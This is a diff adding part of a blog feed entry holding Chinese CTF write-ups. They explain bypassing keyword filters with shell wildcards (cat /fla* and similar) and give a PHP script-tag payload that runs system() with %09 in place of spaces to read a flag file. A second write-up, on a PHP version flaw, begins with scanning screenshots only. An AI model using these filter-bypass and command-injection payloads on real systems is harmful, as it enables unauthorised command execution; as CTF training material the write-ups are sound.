+<p>在shell命令行中，*这样的通配符与其它字符一起组合成表达式，匹配任意长度的字符串。这个字符串的长度可以是0，可以是1，可以是任意数字。</p>
+<p>所以，我们利用?和*在正则表达式和 Shell 命令行中的区别，可以绕过关键字过滤，如下实例：</p>
+<p>假设flag在/flag中:</p>
+<pre><code>cat /fla?
+cat /fla*
+</code></pre>
+<p>假设flag在/flag.txt中:</p>
+<pre><code>cat /fla????
+cat /fla*
+</code></pre>
+<p>假设flag在/flags/flag.txt中:</p>
+<pre><code>cat /fla??/fla????
+cat /fla*/fla*
+</code></pre>
+<p>假设flag在flagg文件加里:</p>
+<pre><code>cat /?????/fla?
+cat /?????/fla*
+</code></pre>
+<p>我们可以用以上格式的 Payload 都可以读取到flag。</p>
+<p>以上基础知识引用自:https://www.freebuf.com/articles/network/279563.html</p>
+<p>回到此题中,就可以很容易构造一个payload:</p>
+<pre><code>&lt;script%09language='php'&gt;system('ta\c%09/f*');&lt;/script&gt;
+</code></pre>
+<p>这里需要用<code>%09</code>来替换空格</p>
+<h2 id="fsctf-2023签到plus">[FSCTF 2023]签到plus</h2>
+<p>这里是考察了一个php版本漏洞,但当时并没有扫出来目录下的<code>shell.php</code>,于是就蒙了<br>
+复现:<br>
+扫目录:<br>
+<img src="https://NaCl1.github.io/post-images/1698252699962.png" alt="" loading="lazy"></p>
+<p>wp里说有php敏感版本,具体怎么发现没细说,我这里用nmap扫了一下<br>
+<img src="https://NaCl1.github.io/post-images/1698253273731.png" alt="" loading="lazy"></p>
+<p>https://www.ai2news.com/blog/3109593/</p>
+]]></content>
+    </entry>
+</feed>
